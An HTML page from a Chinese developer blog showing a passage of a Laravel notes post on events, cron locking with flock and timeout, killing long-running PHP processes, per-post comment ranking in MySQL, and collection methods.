<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">
<script>
    (function () {
        if ('') {
            if (prompt('请输入文章密码') !== '') {
                alert('密码错误！');
                if (history.length === 1) {
                    location.replace("https://google.com"); // 这里替换成你的首页
                } else {
                    history.back();
                }
            }
        }
    })();
</script>








<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta property="og:type" content="website">
<meta property="og:title" content="苏生不惑的博客">
<meta property="og:url" content="http://yoursite.com/page/26/index.html">
<meta property="og:site_name" content="苏生不惑的博客">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="苏生不惑的博客">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/26/">



<meta name="referrer" content="never"> ​​​​


  <title>苏生不惑的博客</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">苏生不惑的博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/27/laravel-笔记/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/27/laravel-笔记/" itemprop="url">laravel 笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-27T19:44:44+08:00">
                2019-03-27
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  28.2k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  135 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="事件的使用Laravel-启动流程分析"><a href="#事件的使用Laravel-启动流程分析" class="headerlink" title="事件的使用Laravel 启动流程分析"></a>事件的使用Laravel 启动流程分析</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">php artisan make:event UserRegistered</span><br><span class="line"></span><br><span class="line">php artisan make:listener SendWelcomeMail --event=UserRegistered</span><br><span class="line"></span><br><span class="line">php artisan make:listener UpdateReferrer --event=UserRegistered</span><br><span class="line">protected $listen = [ </span><br><span class="line">    UserRegistered::<span class="function"><span class="params">class</span> =&gt;</span> [ </span><br><span class="line">        SendWelcomeMail::<span class="class"><span class="keyword">class</span>, </span></span><br><span class="line">        UpdateReferrer::class,</span><br><span class="line">    ]</span><br><span class="line">];</span><br><span class="line">https:<span class="comment">//learnku.com/articles/26152</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">boot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        parent::boot();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span>::created(<span class="function"><span class="keyword">function</span> (<span class="params">User $user</span>) </span>&#123;</span><br><span class="line">            \event(<span class="keyword">new</span> UserRegistered($user));</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="cron-timeout"><a href="#cron-timeout" class="headerlink" title="cron timeout"></a>cron timeout</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">crontab定时启动任务，flock保证互斥，timeout设置超时以及报警脚本</span><br><span class="line">flock -xn /tmp/lock /path/to/php /path/to/file</span><br><span class="line">让我们再来重放一下故障场景：假如上一分钟的 A 请求还没退出，下一分钟的 B 请求也启动了，那么 B 请求会发现 A 请求还没有释放锁，于是它不会执行。</span><br><span class="line">假如因为某些无法预知的原因，导致脚本不能正常结束请求，进而导致不能正常释放锁，那么后续所有其它的 CD 等请求也都无法执行了，如何避免？答案是 timeout，它实现了超时控制机制：</span><br><span class="line">https:<span class="comment">//huoding.com/2016/12/12/573  https://juejin.im/post/5bb4fc0de51d450e597b6d51</span></span><br><span class="line">timeout -s SIGINT <span class="number">100</span> flock -xn /tmp/lock /path/to/php /path/to/file</span><br><span class="line">让我们再来重放一下故障场景：假如上一分钟的 A 请求还没退出，下一分钟的 B 请求也启动了，那么 B 请求会发现 A 的请求还没有释放锁，于是它不会执行，不过下下分钟的 C 请求肯定能执行，因为在这之前，A 请求已经因为超时被 timeout 干掉了。</span><br><span class="line"></span><br><span class="line"># 超时发送-9信号，超时执行后面的脚本输出failed</span><br><span class="line">timeout -s <span class="number">9</span> <span class="number">5</span> sleep <span class="number">20</span> || echo <span class="string">'failed'</span></span><br><span class="line"># 未超时执行后面的脚本输出success</span><br><span class="line">timeout -s <span class="number">9</span> <span class="number">10</span> sleep <span class="number">5</span> &amp;&amp; echo <span class="string">'success'</span></span><br><span class="line"> 需要注意的点</span><br><span class="line"></span><br><span class="line">timeout 正常结束的返回码是<span class="number">0</span></span><br><span class="line">timeout 超时kill结束的返回码是<span class="number">124</span></span><br><span class="line"></span><br><span class="line"> 假设<span class="number">6</span>分钟执行一次且互斥非阻塞，超时<span class="number">10</span>分钟且超时执行报警脚本，则最终crontab文件如下</span><br><span class="line"> *<span class="regexp">/6 * * * * cd /</span>data/projec &amp;&amp; flock -xn ./task.lock -c <span class="string">'timeout -9 600 sh task.sh || sh alarm.sh'</span></span><br><span class="line"> 需要注意的点</span><br><span class="line"> 如果task.sh启动了子进程进行处理，则需要在task.sh的末尾加上wait命令等待全部子进程完成才结束，否则timeout无效</span><br><span class="line"> cd /data/project</span><br><span class="line"> nohub python3 main.py &gt;main.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;</span><br><span class="line"> wait</span><br><span class="line"> https:<span class="comment">//juejin.im/post/5bb4fc0de51d450e597b6d51</span></span><br></pre></td></tr></table></figure>
<h3 id="杀死过期进程"><a href="#杀死过期进程" class="headerlink" title="杀死过期进程"></a>杀死过期进程</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">fire</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $pids = $<span class="keyword">this</span>-&gt;getPids([<span class="string">"php"</span>, <span class="string">"shell_lock"</span>]);</span><br><span class="line">            foreach ($pids <span class="keyword">as</span> $pid) &#123;</span><br><span class="line">                $startTime = $<span class="keyword">this</span>-&gt;getProcessStartTime($pid);</span><br><span class="line">                $<span class="keyword">this</span>-&gt;ifKill($startTime, $pid);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception $e) &#123;</span><br><span class="line">            Log::error(<span class="string">"["</span> . ClientIp::getIp() . <span class="string">"][LONG TIME KILLER]: "</span> . $e-&gt;getMessage() . <span class="string">"\r\n"</span> . $e-&gt;getTraceAsString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">getPids</span>(<span class="params">$arr</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $command = <span class="string">"ps aux | grep -v grep "</span>;</span><br><span class="line">        foreach ($arr <span class="keyword">as</span> $word) &#123;</span><br><span class="line">            $command .= <span class="string">"| grep &#123;$word&#125;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $command .= <span class="string">" | awk '&#123;print $2&#125;'"</span>;</span><br><span class="line">        $result = shell_exec($command);</span><br><span class="line">        $result = trim($result);</span><br><span class="line">        <span class="keyword">if</span> (empty($result)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> explode(<span class="string">"\n"</span>, $result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">getProcessStartTime</span>(<span class="params">$pid</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/*ps -p 18994 -o lstart</span></span><br><span class="line"><span class="comment">                           STARTED</span></span><br><span class="line"><span class="comment">          Thu Mar 21 10:25:38 2019</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        $command = <span class="string">"ps -p &#123;$pid&#125; -o lstart"</span>;</span><br><span class="line">        $result = shell_exec($command);</span><br><span class="line">        $result = trim(str_replace(<span class="string">"STARTED"</span>, <span class="string">""</span>, $result));</span><br><span class="line">        <span class="keyword">if</span> (empty($result)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $ctime = \Carbon\Carbon::createFromFormat(<span class="string">"D M j H:i:s Y"</span>, $result);</span><br><span class="line">        <span class="keyword">return</span> $ctime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">ifKill</span>(<span class="params">Carbon $ctime, $pid</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($ctime-&gt;lt(\Carbon\Carbon::now()-&gt;addHours(<span class="number">-1</span>))) &#123;</span><br><span class="line">            $cmd = file_get_contents(<span class="string">"/proc/&#123;$pid&#125;/cmdline"</span>);</span><br><span class="line">            $logString =   Carbon::now()-&gt;toDateTimeString() . <span class="string">"]Killing pid &#123;$pid&#125; started at "</span> . $ctime-&gt;toDateTimeString() . <span class="string">" lasts for more than 1 hour, start script is `"</span> . $cmd . <span class="string">"`"</span>;</span><br><span class="line">            \Log::info($logString);</span><br><span class="line">            shell_exec(<span class="string">"kill -9 &#123;$pid&#125;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pid <span class="keyword">in</span> $(ps aux|grep <span class="string">'artisan   '</span> | grep -v grep | awk <span class="string">'&#123;print $2&#125;'</span>); <span class="keyword">do</span> kill <span class="number">-9</span> $pid; done</span><br><span class="line">ps -ef | pgrep -f <span class="string">"search"</span> | xargs kill <span class="number">-9</span></span><br></pre></td></tr></table></figure>
<h3 id="每个文章的前10条评论一同查询出来"><a href="#每个文章的前10条评论一同查询出来" class="headerlink" title="每个文章的前10条评论一同查询出来"></a>每个文章的前10条评论一同查询出来</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$posts = Post::paginate(<span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">$postIds = $posts-&gt;pluck(<span class="string">'id'</span>)-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">//找出符合条件的 comments ，同时定义 @post, @rank 变量，这里没有用 all,get 等函数，此时并不会执行 SQL 语句。</span></span><br><span class="line">$sub = Comment::whereIn(<span class="string">'post_id'</span>,$postIds)-&gt;select(DB::raw(<span class="string">'*,@post := NULL ,@rank := 0'</span>))-&gt;orderBy(<span class="string">'post_id'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//把上面构造的 sql 查询作为子表进行查询，根据 post_id 进行分区的同时 @rank 变量不断+1</span></span><br><span class="line">$sub2 = DB::table( DB::raw(<span class="string">"(&#123;$sub-&gt;toSql()&#125;) as b"</span>) )</span><br><span class="line">            -&gt;mergeBindings($sub-&gt;getQuery())</span><br><span class="line">            -&gt;select(DB::raw(<span class="string">'b.*,IF (</span></span><br><span class="line"><span class="string">            @post = b.post_id ,@rank :=@rank + 1 ,@rank := 1</span></span><br><span class="line"><span class="string">        ) AS rank,</span></span><br><span class="line"><span class="string">        @post := b.post_id'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//取出符合条件的前10条comment</span></span><br><span class="line">$commentIds = DB::table( DB::raw(<span class="string">"(&#123;$sub2-&gt;toSql()&#125;) as c"</span>) )</span><br><span class="line">            -&gt;mergeBindings($sub2)</span><br><span class="line">        -&gt;where(<span class="string">'rank'</span>,<span class="string">'&lt;'</span>,<span class="number">11</span>)-&gt;select(<span class="string">'c.id'</span>)-&gt;pluck(<span class="string">'id'</span>)-&gt;toArray();</span><br><span class="line"></span><br><span class="line">$comments = Comment::whereIn(<span class="string">'id'</span>,$commentIds)-&gt;get();</span><br><span class="line"></span><br><span class="line">$posts = $posts-&gt;each(<span class="function"><span class="keyword">function</span> (<span class="params">$item, $key</span>) <span class="title">use</span> (<span class="params">$comments</span>) </span>&#123;</span><br><span class="line">    $item-&gt;comments = $comments-&gt;where(<span class="string">'post_id'</span>,$item-&gt;id);</span><br><span class="line">&#125;);</span><br><span class="line">会产生三条sql https:<span class="comment">//learnku.com/articles/20315</span></span><br><span class="line">select * <span class="keyword">from</span> <span class="string">`posts`</span> limit <span class="number">15</span> offset <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">select <span class="string">`c`</span>.<span class="string">`id`</span> <span class="keyword">from</span> (select b.*,IF (</span><br><span class="line">@post = b.post_id ,@rank :=@rank + <span class="number">1</span> ,@rank := <span class="number">1</span></span><br><span class="line">) AS rank,</span><br><span class="line">@post := b.post_id <span class="keyword">from</span> (select *,@post := NULL ,@rank := <span class="number">0</span> <span class="keyword">from</span> <span class="string">`comments`</span> where <span class="string">`post_id`</span> <span class="keyword">in</span> (<span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'10'</span>, <span class="string">'11'</span>, <span class="string">'12'</span>, <span class="string">'13'</span>, <span class="string">'14'</span>, <span class="string">'15'</span>, <span class="string">'16'</span>) order by <span class="string">`post_id`</span> asc) <span class="keyword">as</span> b) <span class="keyword">as</span> c where <span class="string">`rank`</span> &lt; <span class="string">'11'</span>;</span><br><span class="line"></span><br><span class="line">select * <span class="keyword">from</span> <span class="string">`comments`</span> where <span class="string">`id`</span> <span class="keyword">in</span> (<span class="string">'180'</span>, <span class="string">'589'</span>, <span class="string">'590'</span>, <span class="string">'3736'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-集合"><a href="#Laravel-集合" class="headerlink" title="Laravel 集合"></a>Laravel 集合</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/laravel/t/26110</span></span><br><span class="line"></span><br><span class="line">  $users = User::all();</span><br><span class="line">        $users-&gt;contains(<span class="string">'name'</span>, <span class="string">'Chasity Tillman'</span>);</span><br><span class="line">        <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line">        $collection = collect([<span class="string">'name'</span> =&gt; <span class="string">'John'</span>, <span class="string">'age'</span> =&gt; <span class="number">23</span>]);</span><br><span class="line">        $collection-&gt;contains(<span class="string">'Jane'</span>);</span><br><span class="line">        <span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">        $collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line">        $collection-&gt;contains(<span class="function"><span class="keyword">function</span> (<span class="params">$key, $value</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $value &lt;= <span class="number">5</span>;</span><br><span class="line">            <span class="comment">//true</span></span><br><span class="line">        &#125;);</span><br><span class="line"> $users = User::all();</span><br><span class="line">        $youngsters = $users-&gt;filter(<span class="function"><span class="keyword">function</span> (<span class="params">$value, $key</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $value-&gt;age &lt; <span class="number">35</span>;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        $youngsters-&gt;all();</span><br><span class="line">        <span class="comment">// 所有年龄小于 35 的用户</span></span><br><span class="line">        $movies = collect([</span><br><span class="line">                    [</span><br><span class="line">                        <span class="string">'name'</span> =&gt; <span class="string">'Back To The Future'</span>,</span><br><span class="line">                        <span class="string">'releases'</span> =&gt; [<span class="number">1985</span>, <span class="number">1989</span>, <span class="number">1990</span>]</span><br><span class="line">                    ],</span><br><span class="line">                    [</span><br><span class="line">                        <span class="string">'name'</span> =&gt; <span class="string">'Fast and Furious'</span>,</span><br><span class="line">                        <span class="string">'releases'</span> =&gt; [<span class="number">2001</span>, <span class="number">2003</span>, <span class="number">2006</span>, <span class="number">2009</span>, <span class="number">2011</span>, <span class="number">2013</span>, <span class="number">2015</span>, <span class="number">2017</span>]</span><br><span class="line">                    ],</span><br><span class="line">                    [</span><br><span class="line">                        <span class="string">'name'</span> =&gt; <span class="string">'Speed'</span>,</span><br><span class="line">                        <span class="string">'releases'</span> =&gt; [<span class="number">1994</span>]</span><br><span class="line">                    ]</span><br><span class="line">                ]);</span><br><span class="line">        </span><br><span class="line">                $mostReleases = $movies-&gt;sortByDesc(<span class="function"><span class="keyword">function</span> (<span class="params">$movie, $key</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> count($movie[<span class="string">'releases'</span>]);</span><br><span class="line">                &#125;);</span><br><span class="line">        </span><br><span class="line">                $mostReleases-&gt;toArray();</span><br><span class="line">                <span class="comment">//列出以上映总数降序排序的电影</span></span><br><span class="line">        </span><br><span class="line">                dd($mostReleases-&gt;values()-&gt;toArray());</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                   列出以上映总数降序排序的电影并重置键值</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">                 $movies = collect([</span><br><span class="line">                            [<span class="string">'name'</span> =&gt; <span class="string">'Back To the Future'</span>, <span class="string">'genre'</span> =&gt; <span class="string">'scifi'</span>, <span class="string">'rating'</span> =&gt; <span class="number">8</span>],</span><br><span class="line">                            [<span class="string">'name'</span> =&gt; <span class="string">'The Matrix'</span>,  <span class="string">'genre'</span> =&gt; <span class="string">'fantasy'</span>, <span class="string">'rating'</span> =&gt; <span class="number">9</span>],</span><br><span class="line">                            [<span class="string">'name'</span> =&gt; <span class="string">'The Croods'</span>,  <span class="string">'genre'</span> =&gt; <span class="string">'animation'</span>, <span class="string">'rating'</span> =&gt; <span class="number">8</span>],</span><br><span class="line">                            [<span class="string">'name'</span> =&gt; <span class="string">'Zootopia'</span>,  <span class="string">'genre'</span> =&gt; <span class="string">'animation'</span>, <span class="string">'rating'</span> =&gt; <span class="number">4</span>],</span><br><span class="line">                            [<span class="string">'name'</span> =&gt; <span class="string">'The Jungle Book'</span>,  <span class="string">'genre'</span> =&gt; <span class="string">'fantasy'</span>, <span class="string">'rating'</span> =&gt; <span class="number">5</span>],</span><br><span class="line">                        ]);</span><br><span class="line">                </span><br><span class="line">                        $genre = $movies-&gt;groupBy(<span class="string">'genre'</span>);</span><br><span class="line">                        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                        [</span></span><br><span class="line"><span class="comment">                             "scifi" =&gt; [</span></span><br><span class="line"><span class="comment">                               ["name" =&gt; "Back To the Future", "genre" =&gt; "scifi", "rating" =&gt; 8,],</span></span><br><span 